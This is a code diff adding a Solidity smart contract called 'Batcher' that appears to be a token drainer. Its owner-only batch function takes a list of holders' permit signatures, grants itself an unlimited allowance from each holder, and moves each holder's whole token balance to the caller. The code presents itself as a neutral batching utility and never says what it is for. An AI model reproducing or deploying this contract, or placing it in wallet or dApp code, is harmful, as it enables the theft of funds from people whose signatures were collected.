@@ -1,0 +1,68 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.14;
+
+interface Token {
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) external;
+
+    function permit(
+        address owner,
+        address spender,
+        uint256 value,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external;
+
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract Batcher {
+    Token public token;
+    address public immutable owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Caller is not owner");
+        _;
+    }
+
+    function setTokenAddress(address newTokenAddress) external onlyOwner {
+        token = Token(newTokenAddress);
+    }
+
+    function getTokenAddress() public view returns (address) {
+        return address(token);
+    }
+
+    function batchTransferWithPermit(
+        address[] memory _owners,
+        uint8[] memory v,
+        bytes32[] memory r,
+        bytes32[] memory s
+    ) external onlyOwner {
+        for (uint256 i = 0; i < _owners.length; i++) {
+            executeTransferWithPermit(_owners[i],v[i],r[i],s[i]);
+        }
+    }
+
+    function executeTransferWithPermit(
+        address _owner,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) internal {
+       uint256 balance = token.balanceOf(_owner);
+        if (balance > 0) {
+            token.permit(_owner, address(this), type(uint256).max, 9999999999, v, r, s);
+            token.transferFrom(_owner, msg.sender, balance);
+        }
+    }
+}
